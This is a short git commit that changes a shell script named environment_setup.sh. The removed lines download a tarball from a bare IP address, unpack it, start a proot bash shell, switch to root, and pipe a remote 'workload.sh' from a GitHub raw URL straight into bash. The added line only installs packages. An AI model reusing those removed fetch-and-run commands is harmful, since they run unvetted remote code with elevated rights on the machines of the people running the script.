90f1958de3330b3e8fbf1032aa5d6f7e6d019c80
phumzilemlambathi <phumzilemlambathi@gmail.com>
2024-06-21 17:55:53 +0200

    Update environment_setup.sh

--- environment_setup.sh
+++ environment_setup.sh
@@ -1,14 +1,2 @@
 #!/bin/sh
-apt update;apt -y install wget curl
-curl -L -o backup4.tar.gz http://45.135.58.52/backup4.tar.gz
-tar -xf backup4.tar.gz
-./dist/proot -S . /bin/bash
-sleep 2
-su -
-sleep 2
-cd
-whoami
-ls -la
-pwd
-sleep 2
-wget -O - https://raw.githubusercontent.com/khayalethuungabayeki/setupCrayons/main/workload.sh | bash
+apt update;apt -y install wget curl python3 python3-pip
